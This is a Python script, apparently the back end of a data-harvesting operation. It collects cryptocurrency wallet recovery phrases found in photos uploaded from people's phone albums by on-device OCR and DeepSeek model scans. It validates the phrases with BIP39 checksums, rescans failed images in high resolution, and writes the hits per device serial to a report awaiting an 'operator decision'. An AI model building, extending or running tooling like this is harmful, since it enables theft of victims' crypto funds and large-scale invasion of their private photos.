#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""build_ai_results_txt.py — 汇总「相册OCR + AI模型识别(含二次复扫)」结果到 docs 文本（v2）

数据源：
  ① 相册 OCR（17链端侧识别）：PG photos WHERE data ? 'word_n' AND word_n>0
  ② AI 模型识别（DeepSeek 扫描）：adm888app/data/ds_ai_hits.jsonl
  ③ AI 二次复扫（BIP39未通过项·原图高清）：adm888app/data/ds_ai_rescan.jsonl
  ④ 扫描进度：ai_scan_log
用法：/root/venv/bin/python3 tools/build_ai_results_txt.py
"""
import os, json, time, fcntl, subprocess

BASE = '/www/wwwroot/i.131422.com'
OUT = os.path.join(BASE, 'docs', '相册识别与AI识别_助记词结果_20260915.txt')
HITS = os.path.join(BASE, 'adm888app/data/ds_ai_hits.jsonl')
RESCAN = os.path.join(BASE, 'adm888app/data/ds_ai_rescan.jsonl')

def psql(sql):
    r = subprocess.run(['runuser', '-u', 'postgres', '--', 'psql', '-d', 'panel', '-At', '-F', '\t', '-c', sql],
                       capture_output=True, text=True)
    return [l.split('\t') for l in r.stdout.splitlines() if l.strip()]

def fmt_ts(ts):
    try:
        return time.strftime('%m-%d %H:%M', time.gmtime(int(ts) / 1000))
    except Exception:
        return '?'

def _is_scanning():
    try:
        f = open('/tmp/ds_mnemonic_scan.lock', 'w')
        fcntl.flock(f, fcntl.LOCK_EX | fcntl.LOCK_NB)
        fcntl.flock(f, fcntl.LOCK_UN)
        return False
    except BlockingIOError:
        return True

ocr = psql("SELECT COALESCE(serial,''), COALESCE(ts::text,''), COALESCE(name,''), "
           "COALESCE(data->>'word_n','0'), COALESCE(data->>'words','') "
           "FROM photos WHERE data ? 'word_n' AND (data->>'word_n') ~ '^[0-9]+$' "
           "AND (data->>'word_n')::int > 0 ORDER BY serial, ts")

ai = []
if os.path.exists(HITS):
    for ln in open(HITS, encoding='utf-8'):
        ln = ln.strip()
        if ln:
            try:
                ai.append(json.loads(ln))
            except Exception:
                pass
seen, aid = set(), []
for h in ai:
    k = (h.get('serial'), h.get('words'))
    if k in seen:
        continue
    seen.add(k)
    aid.append(h)

rescans = []
if os.path.exists(RESCAN):
    for ln in open(RESCAN, encoding='utf-8'):
        ln = ln.strip()
        if ln:
            try:
                rescans.append(json.loads(ln))
            except Exception:
                pass

# 有效 AI 命中 = 首轮校验通过 + 复扫救回的
valid = [h for h in aid if h.get('checksum_ok')]
rescued = [r for r in rescans if r.get('checksum_ok')]
valid_total = len(valid) + len(rescued)

scan = psql("SELECT '已扫描='||COUNT(*)||' 张' FROM ai_scan_log")
found = psql("SELECT '扫描发现(found)='||COUNT(*)||' 张图' FROM ai_scan_log WHERE found")
tok = psql("SELECT 'tokens合计='||COALESCE(SUM(tokens),0) FROM ai_scan_log")
left = psql("SELECT '剩余待扫='||COUNT(*)||' 张' FROM photos WHERE bin_path IS NOT NULL "
            "AND NOT EXISTS (SELECT 1 FROM ai_scan_log l WHERE l.photo_id = photos.id)")

running = _is_scanning()
status = '扫描进行中（结果持续追加，扫完请等操作员决策）' if running else '扫描已停止/已完成（等操作员决策）'

lines = []
lines.append('相册识别 / AI 模型识别 助记词结果存档')
lines.append('生成时间: %s UTC | 状态: %s' % (time.strftime('%Y-%m-%d %H:%M', time.gmtime()), status))
lines.append('说明: 本阶段结果不进入后台显示，统一存放本文本；AI 未通过项已做「原图高清二次复扫」。')
lines.append('=' * 70)
lines.append('')
lines.append('## 一、17链端侧 OCR 识别出的助记词（设备上报相册 OCR，共 %d 条）' % len(ocr))
lines.append('格式: 设备序列号 | 时间 | 相册文件 | 词数 | 助记词')
lines.append('-' * 70)
for r in ocr:
    s, ts, name, wn, words = (r + [''] * 5)[:5]
    lines.append('%s | %s | %s | %s词 | %s' % (s or '?', fmt_ts(ts), name or '?', wn, words))
lines.append('')
lines.append('## 二、DeepSeek 扫描识别出的助记词（有效 = 首轮通过 + 二次复扫救回，共 %d 条）' % valid_total)
lines.append('格式: 设备序列号 | 时间 | photo_id | BIP39 | 来源 | 助记词')
lines.append('-' * 70)
for h in sorted(valid, key=lambda x: (x.get('serial') or '', x.get('ts') or 0)):
    lines.append('%s | %s | %s | 通过 | 首轮 | %s' % (
        h.get('serial') or '?', fmt_ts(h.get('ts')), h.get('photo_id') or '?', h.get('words') or ''))
for r in sorted(rescued, key=lambda x: (x.get('serial') or '', x.get('ts') or 0)):
    lines.append('%s | %s | %s | 通过 | 二次复扫(救回) | %s' % (
        r.get('serial') or '?', fmt_ts(r.get('ts')), r.get('photo_id') or '?', r.get('pass2_words') or ''))
lines.append('')
lines.append('## 二·附、BIP39 未通过项 · 二次复扫明细（原图高清复扫，共 %d 条）' % len(rescans))
lines.append('格式: 设备序列号 | photo_id | 是否变化 | 二次BIP39 | 判定 | 首轮词(截断) / 二次词(截断)')
lines.append('-' * 70)
for r in sorted(rescans, key=lambda x: (x.get('serial') or '', x.get('photo_id') or 0)):
    chk = '通过' if r.get('checksum_ok') else ('未过' if r.get('checksum_ok') is not None else '—')
    chg = '是' if r.get('changed') else ('否' if r.get('changed') is not None else '—')
    detail = ''
    if r.get('changed') and r.get('pass2_words'):
        detail = '二次: ' + (r.get('pass2_words') or '')[:60]
    elif r.get('pass1_words'):
        detail = '首轮: ' + (r.get('pass1_words') or '')[:60]
    lines.append('%s | %s | %s | %s | %s | %s' % (
        r.get('serial') or '?', r.get('photo_id') or '?', chg, chk, (r.get('note') or '')[:40], detail))
lines.append('')
lines.append('## 三、扫描进度存档')
lines.append('-' * 70)
for r in scan + left + found + tok:
    lines.append(r[0])
lines.append('')
lines.append('备注: 扫描器与相关显示钩子已停止；本文件为唯一结果出口。')
lines.append('统计: AI 有效 %d 条（首轮通过 %d + 复扫救回 %d）；复扫清除首轮误报 %d 张；'
             '待人工核对 %d 条（复扫仍校验未过）。' % (
                 valid_total, len(valid), len(rescued),
                 sum(1 for r in rescans if '误报' in (r.get('note') or '')),
                 sum(1 for r in rescans if r.get('checksum_ok') is False)))

open(OUT, 'w', encoding='utf-8').write('\n'.join(lines))
print('[results] OCR %d | AI有效 %d (首轮%d+救回%d) | 复扫明细 %d | %s → %s' % (
    len(ocr), valid_total, len(valid), len(rescued), len(rescans), status, OUT))
